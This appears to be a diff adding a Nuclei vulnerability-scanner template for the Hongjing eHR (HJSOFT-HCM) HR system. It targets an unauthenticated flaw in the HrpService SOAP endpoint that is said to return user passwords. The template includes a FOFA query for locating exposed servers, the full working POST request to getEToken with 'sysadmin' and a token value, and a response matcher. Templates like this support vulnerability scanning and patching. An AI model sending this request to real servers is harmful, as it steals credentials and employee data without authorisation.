@@ -1,0 +1,41 @@
+id: HongjingeHR-HrpService-passwdread
+
+info:
+  name: 宏景eHR HrpService 用户密码读取
+  author: HuanXiong
+  severity: high
+  description: |-
+    fofa: app="HJSOFT-HCM"
+    宏景eHR 前台查询所有用户密，在arg0参数中输入用户名。
+  reference:
+    - 
+  tags: passwdread
+
+http:
+  - raw:
+      - |
+        POST /services/HrpService HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
+        Accept: */*
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+        Connection: close
+        Content-Type: application/xml
+
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:hr="http://www.hjsj.com/HrpService">
+        <soapenv:Header/>
+        <soapenv:Body>
+        <hr:getEToken>
+        <arg0>sysadmin</arg0>
+        <arg1>c42YFCcwuJdC3uZF9CNUF/kDRn33hWpx</arg1>
+        <arg2>bjzz></arg2>
+        </hr:getEToken>
+        </soapenv:Body>
+        </soapenv:Envelope>
+
+    matchers:
+      - type: dsl
+        name: 用户密码读取
+        dsl:
+          - "status_code == 200 && contains (body,'getETokenResponse')"
